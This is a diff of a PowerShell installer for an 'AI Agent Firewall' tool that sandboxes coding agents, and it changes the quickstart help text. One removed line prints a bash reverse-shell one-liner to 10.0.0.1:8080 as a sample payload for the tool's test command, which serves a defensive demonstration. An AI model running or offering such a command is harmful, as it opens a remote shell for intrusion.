@@ -66,7 +66,10 @@ $env:Path = "$BinDir;$env:Path"
 Write-Host "`n✓ AI Agent Firewall successfully installed on Windows!" -ForegroundColor Green
 Write-Host "Commands available: aaf, ai-firewall, agent-firewall`n" -ForegroundColor Green
 
-Write-Host "Try it right now:" -ForegroundColor Cyan
-Write-Host "  aaf --help" -ForegroundColor White
-Write-Host "  aaf test `"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`"" -ForegroundColor White
-Write-Host "  aaf watch ." -ForegroundColor White
+Write-Host "Quickstart Commands:" -ForegroundColor Cyan
+Write-Host "  aaf                  Open interactive 1-terminal coding agent picker" -ForegroundColor White
+Write-Host "  aaf run agy          Launch Google Antigravity CLI inside firewall" -ForegroundColor White
+Write-Host "  aaf run claude       Launch Anthropic Claude Code inside firewall" -ForegroundColor White
+Write-Host "  aaf watch .          Watch current workspace for rogue agent actions" -ForegroundColor White
+Write-Host "  aaf test `"code`"      Test any prompt or payload against behavioral brain" -ForegroundColor White
+Write-Host ""
